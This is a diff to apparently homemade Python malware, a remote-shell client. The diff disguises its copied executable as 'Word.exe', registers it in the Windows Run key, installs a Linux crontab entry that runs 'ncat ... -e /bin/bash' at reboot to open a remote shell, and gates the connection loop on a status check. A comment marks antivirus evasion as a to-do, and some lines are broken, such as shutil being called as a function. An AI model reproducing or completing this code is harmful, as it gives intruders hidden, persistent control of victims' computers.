@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 from ast import Pass
+from pydoc import locate
 from re import T
 import socket
 import subprocess
@@ -8,6 +9,7 @@ import os
 import base64
 import sys
 import shutil
+from webbrowser import get
 import requests
 
 IP = "localhost".encode('utf-8')  # change this
@@ -23,7 +25,8 @@ class MotherFucker():
     def persistence(self):
         #Windows bullshit  adds it self to registery and starts fucking arount
         if sys.platform == "win32" or sys.platform == "win64":
-            location = os.environ["appdata"] + "\\Windows Explorer.exe"
+            location = os.environ["appdata"] + "\\Word.exe"
+            shutil(sys.executable, location)
             subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d ''' + location + '"', shell=True)
         elif sys.platform == 'linux':
             subprocess.call(f'(crontab -l ; echo "@reboot sleep 200 && ncat {IP} {PORT} -e /bin/bash")|crontab 2> /dev/null ', shell=True)
@@ -114,8 +117,9 @@ def get_status():
 #TODO: AV-Evasion Confirmation
 while True:
     try:
-        jja213415 = MotherFucker(IP, PORT)
-        jja213415.run()
+        if get_status():
+            jja213415 = MotherFucker(IP, PORT)
+            jja213415.run()
     except Exception as e:
         print(e)
         continue
